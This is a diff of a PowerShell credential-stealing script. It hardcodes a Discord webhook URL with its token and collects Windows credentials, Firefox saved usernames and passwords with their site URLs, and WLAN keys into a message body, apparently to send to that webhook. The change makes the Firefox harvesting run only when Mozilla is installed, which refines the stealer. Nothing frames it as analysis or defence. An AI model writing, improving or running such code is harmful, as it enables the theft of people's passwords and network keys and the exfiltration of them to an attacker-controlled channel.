@@ -8,7 +8,6 @@ try {
 $webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"
 
 
-
 function IsInstalled($appName){
     $AppToCheck = '`'+$appName+'*'
     $check = Get-Package | Where-Object -Property Name -like $AppToCheck
@@ -120,16 +119,19 @@ foreach ($cred in $WCred) {
 }
 
 
-$Body.content += "```````n:fox:  **FireFox Credentials**``````"
 
 # Getting FireFox Credentials
-$FCreds = Get-FireFoxCred
-foreach ($cred in $FCreds){
-    $username = $cred.username
-    $password = $cred.password
-    $url = $cred.hostname
-    $Body.content += "$username"+":"+"$password"+" ($url)`n"
+if (IsInstalled -appName "Mozilla"){
+    $Body.content += "```````n:fox:  **FireFox Credentials**``````"
+    $FCreds = Get-FireFoxCred
+    foreach ($cred in $FCreds){
+        $username = $cred.username
+        $password = $cred.password
+        $url = $cred.hostname
+        $Body.content += "$username"+":"+"$password"+" ($url)`n"
+    }
 }
+
 
 # Getting WLAN Keys
 $Body.content += "```````n:key:  **WLAN Keys**``````"
